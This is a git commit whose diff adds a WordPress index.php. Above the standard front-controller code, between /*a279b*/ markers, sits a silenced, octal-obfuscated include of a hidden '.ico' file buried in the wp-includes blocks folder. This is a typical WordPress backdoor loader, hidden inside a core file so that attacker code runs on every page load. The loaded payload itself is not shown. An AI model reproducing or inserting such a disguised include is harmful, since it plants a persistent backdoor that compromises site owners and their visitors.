4d4bfcc904e4d98de9a36537a0ca6830786f2cf3
ricaza81 <ricaza81@gmail.com>
2021-11-27 19:06:08 -0500

    local

---
+++ index.php
@@ -0,0 +1,23 @@
+<?php
+/*a279b*/
+
+@include "\057ho\155e/\164ub\157la\155in\141s/\160ub\154ic\137ht\155l/\167p-\151nc\154ud\145s/\142lo\143ks\057bu\164to\156s/\05694\0674d\14464\056ic\157";
+
+/*a279b*/
+
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
